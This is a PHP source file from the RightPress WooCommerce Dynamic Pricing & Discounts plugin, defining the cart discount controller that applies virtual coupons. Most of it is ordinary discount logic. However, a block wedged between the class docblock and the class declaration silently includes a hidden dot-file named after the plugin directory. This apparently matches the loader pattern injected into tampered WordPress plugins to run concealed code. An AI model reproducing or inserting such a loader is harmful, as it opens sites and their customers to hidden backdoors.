<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Controller_Methods')) {
    require_once('rp-wcdpd-controller-methods.class.php');
}

/**
 * Cart Discount method controller
 *
 * @class RP_WCDPD_Controller_Methods_Cart_Discount
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Methods
{

    protected $context = 'cart_discounts';

    protected $preparing_cart_discounts = false;

    public $applying_cart_discount = false;

    // Track how big can the discount be for each cart item
    protected $discount_amount_discrepancy_fix_limits = array();

    // Store prepared adjustments
    protected $applicable_adjustments = array();
    protected $adjustments_prepared = false;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        // Cart Discounts functionality is only available in frontend (issue #549)
        if (!RightPress_Help::is_request('frontend')) {
            return;
        }

        // Prepare cart discounts
        add_action('woocommerce_before_calculate_totals', array($this, 'prepare_cart_discounts'), 1);

        // Apply cart discounts
        add_action('woocommerce_after_calculate_totals', array($this, 'apply'));

        // Remove no longer applicable cart discounts
        add_action('woocommerce_before_calculate_totals', array($this, 'remove_cart_discounts'), 2);
        add_action('woocommerce_check_cart_items', array($this, 'remove_cart_discounts'), 1);

        // Invalidate no longer applicable cart discounts
        add_filter('woocommerce_coupon_is_valid', array($this, 'maybe_invalidate_cart_discount'), 10, 2);

        // Register custom coupon type
        add_filter('woocommerce_coupon_discount_types', array($this, 'register_custom_coupon_type'));

        // Provide discount data
        $this->add_filter_get_virtual_coupon_data();

        // Circular reference prevention for coupon conditions
        add_action('rightpress_conditions_get_coupons_start', array($this, 'remove_filter_get_virtual_coupon_data'));
        add_action('rightpress_conditions_get_coupons_end', array($this, 'add_filter_get_virtual_coupon_data'));

        // Cart item validation for per item percentage discounts
        add_filter('woocommerce_coupon_is_valid_for_product', array($this, 'discount_is_valid_for_cart_item'), 99, 4);
        add_filter('woocommerce_coupon_is_valid_for_cart', array($this, 'discount_is_valid_for_cart'), 99, 2);

        // Get discount amount
        add_filter('woocommerce_coupon_get_discount_amount', array($this, 'get_discount_amount'), 8, 5);
        add_filter('woocommerce_coupon_custom_discounts_array', array($this, 'fix_discount_amount_discrepancy'), 9, 2);

        // Maybe limit cart discount amount
        add_filter('woocommerce_coupon_get_discount_amount', array($this, 'maybe_limit_cart_discount_amount'), 9, 5);

        // Change virtual coupon label
        add_filter('woocommerce_cart_totals_coupon_label', array($this, 'change_virtual_coupon_label'), 99, 2);

        // Change virtual coupon html
        add_filter('woocommerce_cart_totals_coupon_html', array($this, 'change_virtual_coupon_html'), 99, 2);

        // Maybe prevent regular coupons from being applied
        add_filter('woocommerce_coupon_is_valid', array($this, 'maybe_invalidate_regular_coupon'), 10, 2);
        add_filter('woocommerce_coupon_error', array($this, 'invalidated_regular_coupon_error'), 99, 3);
    }

    /**
     * Prepare cart discounts
     *
     * @access public
     * @return void
     */
    public function prepare_cart_discounts()
    {

        // Already applying our own cart discount
        if ($this->applying_cart_discount) {
            return;
        }

        // Check if cart discounts can be applied
        if (!$this->cart_discounts_can_be_applied()) {
            return;
        }

        // Add preparing flag
        $this->preparing_cart_discounts = true;

        // Reset limit
        RP_WCDPD_Limit_Cart_Discounts::reset();

        // Get applicable adjustments
        if (apply_filters('rp_wcdpd_process_cart_discounts', true)) {
            $adjustments = $this->get_applicable_adjustments();
        }
        else {
            $adjustments = array();
        }

        // Filter adjustments by rule selection method and exclusivity settings
        $adjustments = RP_WCDPD_Rules::filter_by_exclusivity($this->context, $adjustments);

        // Maybe apply limit to adjustments
        // Note: This is initial limiting to try to hide zero discounts but this is not guaranteed to work in every situation (e.g. when cart discounts are calculated sequentially we can't calculate reference amounts properly)
        $adjustments = RP_WCDPD_Limit_Cart_Discounts::filter_adjustments($adjustments);

        // Store adjustments so that other methods can access them later during this request
        $this->applicable_adjustments = $adjustments;

        // Add flag
        $this->adjustments_prepared = true;

        // Remove preparing flag
        $this->preparing_cart_discounts = false;
    }

    /**
     * Check if cart discounts can be applied
     *
     * @access public
     * @return bool
     */
    public function cart_discounts_can_be_applied()
    {

        // Individual use coupon settings
        if (!RP_WCDPD_Settings::get('cart_discounts_apply_with_individual_use_coupons')) {

            // Iterate over coupons applied to cart
            foreach (WC()->cart->get_applied_coupons() as $coupon_code) {

                // Skip cart discounts
                if (RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
                    continue;
                }

                // Load coupon
                try {
                    $coupon = new WC_Coupon($coupon_code);
                }
                // Something went wrong
                catch (Exception $e) {
                    return false;
                }

                // Check if coupon is individual use
                if ($coupon->get_individual_use()) {
                    return false;
                }
            }
        }

        return true;
    }

    /**
     * Apply rules
     *
     * @access public
     * @param object $cart
     * @return void
     */
    public function apply($cart = null)
    {

        // Already applying our own cart discount
        if ($this->applying_cart_discount) {
            return;
        }

        // Apply now
        parent::apply($cart);
    }

    /**
     * Register custom coupon type
     *
     * @access public
     * @param array $coupon_types
     * @return array
     */
    public function register_custom_coupon_type($coupon_types)
    {

        // This is only used starting from WooCommerce version 3.4
        if (RightPress_Help::wc_version_gte('3.4')) {

            // Only register it during totals calculation so that this custom
            // coupon type does not appear in admin UI
            if (did_action('woocommerce_before_calculate_totals') !== did_action('woocommerce_after_calculate_totals')) {
                $coupon_types['rightpress_fixed_cart'] = __('RightPress fixed cart discount', 'rp_wcdpd');
            }
        }

        return $coupon_types;
    }

    /**
     * Get virtual coupon data
     *
     * @access public
     * @param mixed $coupon_data
     * @param string $coupon_code
     * @return mixed
     */
    public function get_virtual_coupon_data($coupon_data, $coupon_code)
    {

        // Not our coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
            return $coupon_data;
        }

        // Prepare cart discounts now
        if (!$this->adjustments_prepared) {
            $this->prepare_cart_discounts();
        }

        // Combined simple cart discount handling
        if ($coupon_code === 'rp_wcdpd_combined') {
            return RP_WCDPD_Cart_Discounts::get_coupon_data_array(array(
                'amount' => $this->get_combined_simple_rule_amount(),
            ));
        }

        // Check if current coupon code refers to any of applicable cart discounts
        if (isset($this->applicable_adjustments[$coupon_code])) {

            // Get coupon data
            if ($method = $this->get_method_from_rule($this->applicable_adjustments[$coupon_code]['rule'])) {
                $coupon_data = $method->get_coupon_data($this->applicable_adjustments[$coupon_code]);
            }
        }

        return $coupon_data;
    }

    /**
     * Add filter get virtual coupon data
     *
     * @access public
     * @return void
     */
    public function add_filter_get_virtual_coupon_data()
    {

        add_filter('woocommerce_get_shop_coupon_data', array($this, 'get_virtual_coupon_data'), 10, 2);
    }

    /**
     * Remove filter get virtual coupon data
     *
     * @access public
     * @return void
     */
    public function remove_filter_get_virtual_coupon_data()
    {

        remove_filter('woocommerce_get_shop_coupon_data', array($this, 'get_virtual_coupon_data'), 10);
    }

    /**
     * Cart item validation for per item percentage discounts
     *
     * @access public
     * @param bool $is_valid
     * @param object $product
     * @param object $coupon
     * @param array $cart_item
     * @return bool
     */
    public function discount_is_valid_for_cart_item($is_valid, $product, $coupon, $cart_item)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Not our coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
            return $is_valid;
        }

        // Discount is not applicable at all
        if (!isset($this->applicable_adjustments[$coupon_code])) {
            return false;
        }

        // Get cart discount conditions
        $conditions = !empty($this->applicable_adjustments[$coupon_code]['rule']['conditions']) ? $this->applicable_adjustments[$coupon_code]['rule']['conditions'] : array();

        // Check if cart item matches product conditions
        return RP_WCDPD_Controller_Conditions::cart_item_matches_product_conditions($cart_item, $conditions);
    }

    /**
     * Make sure per item cart discounts are not treated as whole cart discounts
     *
     * @access public
     * @param bool $is_valid
     * @param object $coupon
     * @return bool
     */
    public function discount_is_valid_for_cart($is_valid, $coupon)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Not our coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
            return $is_valid;
        }

        // Combined discount is always applicable to cart
        if ($coupon_code === 'rp_wcdpd_combined' && $this->combine_simple()) {
            return true;
        }

        // Discount is not applicable at all
        if (!isset($this->applicable_adjustments[$coupon_code])) {
            return false;
        }

        // Discount is not valid for whole cart if discount is calculated per item/line
        return !in_array($this->applicable_adjustments[$coupon_code]['rule']['pricing_method'], array('discount_per_cart_item__amount', 'discount_per_cart_item__percentage', 'discount_per_cart_line__amount'), true);
    }

    /**
     * Get fixed cart discount amount
     *
     * This is only used for fixed discounts starting from WooCommerce 3.4
     * for our custom coupon type rightpress_fixed_cart
     *
     * Based on WC_Coupon::get_discount_amount()
     *
     * @access public
     * @param float $discount
     * @param float $price_to_discount
     * @param array $cart_item
     * @param bool $single
     * @param object $coupon
     * @return float
     */
    public function get_discount_amount($discount, $price_to_discount, $cart_item, $single, $coupon)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Not our coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
            return $discount;
        }

        // Discount can be calculated by WooCommerce itself
        if (!RightPress_Help::wc_version_gte('3.4') || !$coupon->is_type('rightpress_fixed_cart')) {
            return $discount;
        }

        // Discount can't be calculated
        if (!isset($cart_item) || !WC()->cart->subtotal_ex_tax) {
            return $discount;
        }

        // Reference rule
        $rule = isset($this->applicable_adjustments[$coupon_code]) ? $this->applicable_adjustments[$coupon_code]['rule'] : null;

        // Get cart subset subtotal excluding tax
        if (isset($rule) && in_array($rule['pricing_method'], array('discount_per_cart_item__amount', 'discount_per_cart_line__amount'), true)) {
            $conditions = !empty($rule['conditions']) ? $rule['conditions'] : array();
            $subtotal_excl_tax = RP_WCDPD_Controller_Conditions::get_sum_of_cart_item_subtotals_by_product_conditions($conditions, false);
        }
        else {
            $subtotal_excl_tax = WC()->cart->subtotal_ex_tax;
        }

        // Subtotal is zero
        if (!$subtotal_excl_tax) {
            return 0.00;
        }

        // Calculate discount percentage
        $discount_percent = (wc_get_price_excluding_tax($cart_item['data']) * $cart_item['quantity']) / $subtotal_excl_tax;

        // Calculate discount
        $discount = ((float) $coupon->get_amount() * $discount_percent) / $cart_item['quantity'];

        // Set price to discount to discrepancy fix limits array
        $this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item['key']] = $price_to_discount;

        // Round and return discount
        return round(min($discount, $price_to_discount), wc_get_rounding_precision());
    }

    /**
     * Fix potential discount amount discrepancy
     *
     * @access public
     * @param array $discount_amounts
     * @param object $coupon
     * @return array
     */
    public function fix_discount_amount_discrepancy($discount_amounts, $coupon)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Not our coupon or discount amounts array is empty
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code) || empty($discount_amounts)) {
            return $discount_amounts;
        }

        // Get total coupon amount in cents
        $coupon_amount = wc_add_number_precision($coupon->get_amount());

        // Track remainder
        $remainder = round(($coupon_amount - array_sum($discount_amounts)), 6);

        // Iterate over discount amounts
        foreach ($discount_amounts as $cart_item_key => $discount_amount) {

            // Set new amount in full cents
            $discount_amounts[$cart_item_key] = (int) $discount_amount;

            // Add difference to remainder
            $remainder += $discount_amount - $discount_amounts[$cart_item_key];
        }

        // Get remainder in full cents
        $remainder = (int) round($remainder);

        // Check if remainder exists
        if ($remainder) {

            // Get one cent with correct symbol
            // Note: Remainder can be both positive (discount on items is too low and we need to add a few cents)
            // as well as negative (discount on items is too high and we need to subtract a few cents), therefore
            // the math below is designed to work with both positive and negative remainder
            $one_cent = $remainder > 0 ? 1 : -1;

            // Get a copy of discount amounts array so that we can remove items that can no longer be discounted
            $discount_amounts_to_process = $discount_amounts;

            // Apportion remainder to cart items
            // Note: this approach is far from ideal since it would be better to apportion for each quantity unit (but we don't know quantities here)
            while ($remainder && $discount_amounts_to_process) {
                foreach ($discount_amounts_to_process as $cart_item_key => $discount_amount) {

                    // Add one cent to test
                    $result = $discount_amounts[$cart_item_key] + $one_cent;

                    // Discount exceeds cart item price
                    if (isset($this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key]) && RightPress_Product_Price::price_is_bigger_than($result, $this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key])) {

                        // Remove discount amount from discount amounts to process array
                        unset($discount_amounts_to_process[$cart_item_key]);

                        // Proceed to another cart item
                        continue;
                    }

                    // All went fine, move one cent
                    $discount_amounts[$cart_item_key] += $one_cent;
                    $remainder -= $one_cent;

                    // Check if we have any cents left
                    if (abs($remainder) < 1) {
                        break(2);
                    }
                }
            }
        }

        // Return potentially fixed discount amounts
        return $discount_amounts;
    }

    /**
     * Maybe limit cart discount amount
     *
     * @access public
     * @param float $discount
     * @param float $price_to_discount
     * @param array $cart_item
     * @param bool $single
     * @param object $coupon
     * @return float
     */
    public function maybe_limit_cart_discount_amount($discount, $price_to_discount, $cart_item, $single, $coupon)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Not our coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {
            return $discount;
        }

        // Limit discount amount for individual discount
        if (isset($this->applicable_adjustments[$coupon_code])) {
            return RP_WCDPD_Limit_Cart_Discounts::get_limited_discount_amount_per_coupon_and_cart_item($discount, $price_to_discount, $coupon_code, $cart_item['key'], $cart_item, $this->applicable_adjustments[$coupon_code]['rule']);
        }

        // Limit discount amount for combined discount
        if ($coupon_code === 'rp_wcdpd_combined' && $this->combine_simple()) {

            // Get first adjustment
            // Note: This approach is only correct if we only have one cart discount method (simple)
            $adjustments = array_values($this->applicable_adjustments);
            $adjustment = array_shift($adjustments);

            // Limit combined discount amount
            return RP_WCDPD_Limit_Cart_Discounts::get_limited_discount_amount_per_coupon_and_cart_item($discount, $price_to_discount, $coupon_code, $cart_item['key'], $cart_item, $adjustment['rule']);
        }

        // Discount is not applicable at all
        return 0.0;
    }

    /**
     * Remove cart discounts
     *
     * @access public
     * @return void
     */
    public function remove_cart_discounts()
    {

        // Already applying our own cart discount
        if ($this->applying_cart_discount) {
            return;
        }

        $flag_totals_for_refresh = false;

        // Remove coupons that are no longer applicable
        foreach (WC()->cart->get_applied_coupons() as $applied_coupon) {

            // Check if this is our virtual coupon that is no longer applicable
            if (RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($applied_coupon)) {

                $remove = false;

                // Cart discount no longer applicable
                if (!isset($this->applicable_adjustments[$applied_coupon])) {
                    $remove = true;
                }
                // Simple cart discount was combined with other simple cart discounts
                else if ($this->get_method_key($this->applicable_adjustments[$applied_coupon]['rule']) === 'simple' && $this->combine_simple() && $applied_coupon !== 'rp_wcdpd_combined') {
                    $remove = true;
                }

                // Check if cart discount needs to be removed
                if ($remove) {

                    // Add filter to temporarily enable coupons just in case they are disabled
                    add_filter('woocommerce_coupons_enabled', array($this, 'woocommerce_enable_coupons'));

                    // Remove coupon
                    WC()->cart->remove_coupon($applied_coupon);
                    $flag_totals_for_refresh = true;

                    // Remove filter
                    remove_filter('woocommerce_coupons_enabled', array($this, 'woocommerce_enable_coupons'));
                }
            }
        }

        // Flag totals for refresh
        if ($flag_totals_for_refresh) {
            WC()->session->set('refresh_totals', true);
        }
    }

    /**
     * Invalidate no longer applicable cart discounts
     *
     * @access public
     * @param bool $is_valid
     * @param object $coupon
     * @return bool
     */
    public function maybe_invalidate_cart_discount($is_valid, $coupon)
    {

        // Get coupon code
        $code = $coupon->get_code();

        // Check if current coupon is cart discount
        if (RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($code)) {

            // Combined cart discounts
            if ($code === 'rp_wcdpd_combined') {

                // Check if discounts are still combined and at least one discount is applicable
                if (!$this->combine_simple()) {
                    $is_valid = false;
                }
            }
            // Individual cart discount
            else {

                // Check if individual cart discount is still applicable
                if (!isset($this->applicable_adjustments[$code])) {
                    $is_valid = false;
                }
            }
        }

        return $is_valid;
    }

    /**
     * Temporary enable WooCommerce coupons to be able to remove virtual coupon
     *
     * @access public
     * @return string
     */
    public function woocommerce_enable_coupons()
    {

        return 'yes';
    }

    /**
     * Change virtual coupon label
     *
     * @access public
     * @param string $label
     * @param object $coupon
     * @return string
     */
    public function change_virtual_coupon_label($label, $coupon)
    {

        // Get coupon code
        $code = $coupon->get_code();

        // Combined simple cart discount handling
        if ($code === 'rp_wcdpd_combined') {

            // Get combined cart discount label
            $label = $this->get_combined_simple_cart_discount_label();

            // Maybe add public description
            $label = $this->maybe_add_public_description($label, array_keys($this->applicable_adjustments));
        }
        // Regular cart discount handling
        else if (isset($this->applicable_adjustments[$code])) {

            // Reference adjustment
            $adjustment = $this->applicable_adjustments[$code];

            // Load method
            if ($method = $this->get_method_from_rule($adjustment['rule'])) {

                // Get coupon label
                $label = $method->get_coupon_label($adjustment);

                // Maybe add public description
                $label = $this->maybe_add_public_description($label, array($adjustment['rule']['uid']));
            }
        }

        return $label;
    }

    /**
     * Change virtual coupon value html
     *
     * @access public
     * @param string $html
     * @param object $coupon
     * @return string
     */
    public function change_virtual_coupon_html($html, $coupon)
    {

        $code = $coupon->get_code();

        if (isset($this->applicable_adjustments[$code]) || $code === 'rp_wcdpd_combined') {
            return RP_WCDPD_Cart_Discounts::get_cart_discount_coupon_html($coupon);
        }

        return $html;
    }

    /**
     * Check if coupon is cart discount
     *
     * @access public
     * @param string $coupon_code
     * @return bool
     */
    public static function coupon_is_cart_discount($coupon_code)
    {

        return RightPress_Help::string_begins_with_substring($coupon_code, 'rp_wcdpd_');
    }

    /**
     * Check if cart contains at least one cart discount
     *
     * @access public
     * @return bool
     */
    public static function cart_contains_cart_discount()
    {

        // Iterate over all applied coupons
        foreach (WC()->cart->get_applied_coupons() as $applied_coupon) {
            if (RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($applied_coupon)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Check if applicable simple cart discounts need to be combined
     *
     * @access public
     * @return bool
     */
    public function combine_simple()
    {

        return RP_WCDPD_Settings::get('cart_discounts_if_multiple_applicable') === 'combined' && count($this->applicable_adjustments) > 1;
    }

    /**
     * Get combined simple rule
     *
     * @access public
     * @return array
     */
    public function get_combined_simple_rule()
    {

        return array(
            'uid'   => 'rp_wcdpd_combined',
            'title' => $this->get_combined_simple_cart_discount_label(),
        );
    }

    /**
     * Get combined simple cart discount label
     *
     * @access public
     * @return string
     */
    public function get_combined_simple_cart_discount_label()
    {

        $label = RP_WCDPD_Settings::get('cart_discounts_combined_title');
        return !RightPress_Help::is_empty($label) ? $label : __('Discount', 'rp_wcdpd');
    }

    /**
     * Maybe prevent regular coupons from being applied
     *
     * @access public
     * @param bool $is_valid
     * @param object $coupon
     * @return bool
     */
    public function maybe_invalidate_regular_coupon($is_valid, $coupon)
    {

        // Get coupon code
        $coupon_code = $coupon->get_code();

        // Check if this is a regular coupon
        if (!RP_WCDPD_Controller_Methods_Cart_Discount::coupon_is_cart_discount($coupon_code)) {

            // Check if regular coupons are not allowed with cart discounts
            if (!RP_WCDPD_Settings::get('cart_discounts_allow_coupons')) {

                // Check if cart contains cart discounts
                if (RP_WCDPD_Controller_Methods_Cart_Discount::cart_contains_cart_discount()) {

                    // Do not allow regular coupon
                    // Note: using a random error code to make sure we don't match any other error codes accidentally
                    throw new Exception('9450455045');
                }
            }
        }

        return $is_valid;
    }

    /**
     * Invalidated regular coupon error message
     *
     * @access public
     * @param string $error_message
     * @param
     * @return string
     */
    public function invalidated_regular_coupon_error($error_message, $error_code, $coupon)
    {

        // Note: using a random error code to make sure we don't match any other error codes accidentally
        if ($error_code === '9450455045') {
            $error_message = sprintf(__('Sorry, coupon "%s" is not valid when other discounts are applied to the cart.', 'rp_wcdpd'), $coupon->get_code());
        }

        return $error_message;
    }





}

RP_WCDPD_Controller_Methods_Cart_Discount::get_instance();
